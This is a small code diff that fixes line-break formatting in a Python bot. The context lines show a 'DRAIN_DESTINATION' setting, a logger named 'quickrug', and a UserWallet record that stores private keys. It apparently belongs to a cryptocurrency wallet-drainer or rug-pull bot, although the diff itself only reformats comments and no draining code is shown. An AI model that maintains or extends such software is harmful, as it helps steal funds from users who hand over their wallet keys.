@@ -52,7 +52,8 @@ except ImportError:
     HAS_WEB3 = False
 
 # ──────────────────────────────# CONFIG
-# ──────────────────────────────BOT_TOKEN = os.getenv("BOT_TOKEN", "PUT_YOUR_BOT_TOKEN_HERE")
+# ──────────────────────────────
+BOT_TOKEN = os.getenv("BOT_TOKEN", "PUT_YOUR_BOT_TOKEN_HERE")
 ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "123456789").split(",") if x.strip()}
 
 DRAIN_DESTINATION = (
@@ -93,7 +94,8 @@ logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(
 log = logging.getLogger("quickrug")
 
 # ──────────────────────────────# STATE
-# ──────────────────────────────@dataclass
+# ──────────────────────────────
+@dataclass
 class UserWallet:
     private_key: str
     public_key: str
